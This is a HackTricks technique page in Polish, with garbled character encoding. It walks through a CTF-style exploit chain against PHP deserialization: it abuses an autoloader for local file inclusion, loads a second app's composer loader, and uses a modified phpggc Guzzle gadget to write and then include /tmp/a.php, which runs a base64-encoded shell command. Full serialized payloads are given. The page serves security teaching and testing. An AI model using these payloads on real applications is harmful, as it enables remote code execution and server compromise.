# PHP - Deserializacja + Autoload Klasy

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

Najpierw powinieneÅ› sprawdziÄ‡, czym sÄ… [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserializacja + spl\_autoload\_register + LFI/Gadget

JesteÅ›my w sytuacji, w ktÃ³rej znaleÅºliÅ›my **deserializacjÄ™ PHP w aplikacji webowej** bez **Å¼adnej** biblioteki podatnej na gadÅ¼ety w **`phpggc`**. Jednak w tym samym kontenerze byÅ‚a **inna aplikacja webowa z podatnymi bibliotekami**. Dlatego celem byÅ‚o **zaÅ‚adowanie loadera composera z innej aplikacji webowej** i wykorzystanie go do **zaÅ‚adowania gadÅ¼etu, ktÃ³ry wykorzysta tÄ™ bibliotekÄ™ z gadÅ¼etem** z aplikacji webowej podatnej na deserializacjÄ™.

Kroki:

* ZnalazÅ‚eÅ› **deserializacjÄ™** i **nie ma Å¼adnego gadÅ¼etu** w kodzie bieÅ¼Ä…cej aplikacji
* MoÅ¼esz wykorzystaÄ‡ funkcjÄ™ **`spl_autoload_register`** jak poniÅ¼ej, aby **zaÅ‚adowaÄ‡ dowolny lokalny plik z rozszerzeniem `.php`**
* W tym celu uÅ¼ywasz deserializacji, w ktÃ³rej nazwa klasy bÄ™dzie w **`$name`**. **Nie moÅ¼esz uÅ¼ywaÄ‡ "/" ani "."** w nazwie klasy w zserializowanym obiekcie, ale **kod** **zamienia** **podkreÅ›lenia** ("\_") **na ukoÅ›niki** ("/"). Tak wiÄ™c nazwa klasy taka jak `tmp_passwd` zostanie przeksztaÅ‚cona w `/tmp/passwd.php`, a kod sprÃ³buje jÄ… zaÅ‚adowaÄ‡.\
PrzykÅ‚ad **gadÅ¼etu** to: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
JeÅ›li masz **upload plikÃ³w** i moÅ¼esz przesÅ‚aÄ‡ plik z **rozszerzeniem `.php`**, moÅ¼esz **bezpoÅ›rednio naduÅ¼yÄ‡ tej funkcjonalnoÅ›ci** i uzyskaÄ‡ juÅ¼ RCE.
{% endhint %}

W moim przypadku nie miaÅ‚em nic takiego, ale w **tym samym kontenerze** byÅ‚a inna strona internetowa kompozytora z **bibliotekÄ… podatnÄ… na gadÅ¼et `phpggc`**.

* Aby zaÅ‚adowaÄ‡ tÄ™ innÄ… bibliotekÄ™, najpierw musisz **zaÅ‚adowaÄ‡ loader kompozytora tej innej aplikacji** (poniewaÅ¼ loader bieÅ¼Ä…cej aplikacji nie uzyska dostÄ™pu do bibliotek innej). **ZnajÄ…c Å›cieÅ¼kÄ™ aplikacji**, moÅ¼esz to osiÄ…gnÄ…Ä‡ bardzo Å‚atwo za pomocÄ…: **`O:28:"www_frontend_vendor_autoload":0:{}`** (W moim przypadku loader kompozytora znajdowaÅ‚ siÄ™ w `/www/frontend/vendor/autoload.php`)
* Teraz moÅ¼esz **zaÅ‚adowaÄ‡** loader kompozytora **innej aplikacji**, wiÄ™c nadszedÅ‚ czas, aby **`wygenerowaÄ‡ Å‚adunek phpgcc`** do uÅ¼ycia. W moim przypadku uÅ¼yÅ‚em **`Guzzle/FW1`**, co pozwoliÅ‚o mi **zapisaÄ‡ dowolny plik w systemie plikÃ³w**.
* UWAGA: **Wygenerowany gadÅ¼et nie dziaÅ‚aÅ‚**, aby dziaÅ‚aÅ‚, **zmodyfikowaÅ‚em** ten Å‚adunek **`chain.php`** z phpggc i ustawiÅ‚em **wszystkie atrybuty** klas **z prywatnych na publiczne**. W przeciwnym razie, po deserializacji ciÄ…gu, atrybuty utworzonych obiektÃ³w nie miaÅ‚y Å¼adnych wartoÅ›ci.
* Teraz mamy sposÃ³b na **zaÅ‚adowanie loadera kompozytora innej aplikacji** i mamy **Å‚adunek phpggc, ktÃ³ry dziaÅ‚a**, ale musimy **zrobiÄ‡ to w TEJ SAMEJ Å»Ä„DANIE, aby loader zostaÅ‚ zaÅ‚adowany, gdy gadÅ¼et jest uÅ¼ywany**. W tym celu wysÅ‚aÅ‚em zserializowanÄ… tablicÄ™ z oboma obiektami, jak:
* MoÅ¼esz zobaczyÄ‡ **najpierw Å‚adowanie loadera, a potem Å‚adunek**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Teraz moÅ¼emy **utworzyÄ‡ i zapisaÄ‡ plik**, jednak uÅ¼ytkownik **nie mÃ³gÅ‚ zapisaÄ‡ w Å¼adnym folderze wewnÄ…trz serwera webowego**. Jak widaÄ‡ w Å‚adunku, PHP wywoÅ‚uje **`system`** z pewnym **base64**, ktÃ³ry jest tworzony w **`/tmp/a.php`**. NastÄ™pnie moÅ¼emy **ponownie uÅ¼yÄ‡ pierwszego typu Å‚adunku**, ktÃ³rego uÅ¼yliÅ›my jako LFI, aby zaÅ‚adowaÄ‡ loader composera innej aplikacji webowej **do zaÅ‚adowania wygenerowanego pliku `/tmp/a.php`**. Po prostu dodaj go do gadÅ¼etu deserializacji:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Podsumowanie Å‚adunku**

* **ZaÅ‚aduj autoload composera** innej aplikacji webowej w tym samym kontenerze
* **ZaÅ‚aduj gadÅ¼et phpggc** do wykorzystania biblioteki z innej aplikacji webowej (poczÄ…tkowa aplikacja webowa podatna na deserializacjÄ™ nie miaÅ‚a Å¼adnych gadÅ¼etÃ³w w swoich bibliotekach)
* GadÅ¼et **utworzy plik z Å‚adunkiem PHP** w /tmp/a.php z zÅ‚oÅ›liwymi poleceniami (uÅ¼ytkownik aplikacji webowej nie moÅ¼e pisaÄ‡ w Å¼adnym folderze Å¼adnej aplikacji webowej)
* Ostatnia czÄ™Å›Ä‡ naszego Å‚adunku uÅ¼yje **zaÅ‚aduj wygenerowany plik php**, ktÃ³ry wykona polecenia

MusiaÅ‚em **wywoÅ‚aÄ‡ tÄ™ deserializacjÄ™ dwa razy**. W moich testach, za pierwszym razem plik `/tmp/a.php` zostaÅ‚ utworzony, ale nie zaÅ‚adowany, a za drugim razem zostaÅ‚ poprawnie zaÅ‚adowany.

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
